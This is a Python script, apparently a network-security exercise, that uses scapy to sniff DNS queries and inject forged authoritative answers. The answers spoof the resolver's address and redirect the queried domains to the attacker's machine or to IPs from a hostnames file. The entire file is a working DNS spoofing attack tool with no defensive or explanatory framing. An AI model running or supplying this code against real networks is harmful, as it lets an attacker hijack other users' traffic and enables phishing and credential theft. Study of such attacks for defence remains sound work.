import sys
import argparse
import socket
import netifaces
from scapy.all import *
from scapy.layers.inet import IP, UDP, Ether
from scapy.layers.dns import DNS, DNSQR, DNSRR

import time


global local_ip
global args
global hosts

def injection(packet):
    # print("\n-----------------------------------------------------------\n", packet)
    redirect_ip = local_ip

    
    if (IP in packet) and (UDP in packet) and (DNS in packet) and (DNSQR in packet) and packet[DNS].qr == 0:
        
        # Ether info
        # src_mac = packet[Ether].src
        # dest_mac = packet[Ether].src

        # IP info
        src_ip = packet[IP].src
        dest_ip = packet[IP].dst

        # UDP info
        src_port = packet[UDP].sport
        dest_port = packet[UDP].dport

        # DNS infos
        dns_qd = packet[DNS].qd
        dns_id = packet[DNS].id
        dns_qname = dns_qd.qname.decode("utf-8")[:-1]
        

        
        hostname_ip = hosts.get(dns_qname)
        if hostname_ip != None:
            redirect_ip = hostname_ip
        
        
        injected_packet =  IP(src=dest_ip, dst=src_ip)/ \
                           UDP(sport=dest_port, dport=src_port)/ \
                           DNS(id=dns_id, qd=dns_qd, aa=1, qr=1, an=DNSRR(rrname=dns_qd.qname, ttl=10, rdata=redirect_ip))
        
        send(injected_packet)
        # DEBUG
        # print(packet)
        # print(injected_packet.summary())


if __name__ == '__main__':
    parse = argparse.ArgumentParser(add_help=False)
    address_family = netifaces.AF_INET
    interface_ip, network_interface = netifaces.gateways()['default'][address_family]

    parse.add_argument("-i", "--interface", default=network_interface)
    parse.add_argument("-h", "--hostname", default="hostnames")
    args = parse.parse_args()

    hosts = {}
    with open(args.hostname, "r") as hostname_file:
        for line in hostname_file:
            ip, domain = line.rstrip().split(',')
            hosts[domain] = ip

    addresses = netifaces.ifaddresses(network_interface)
    local_ip = addresses[address_family][0]['addr']

    sniff(iface = str(args.interface), prn=injection, store=False)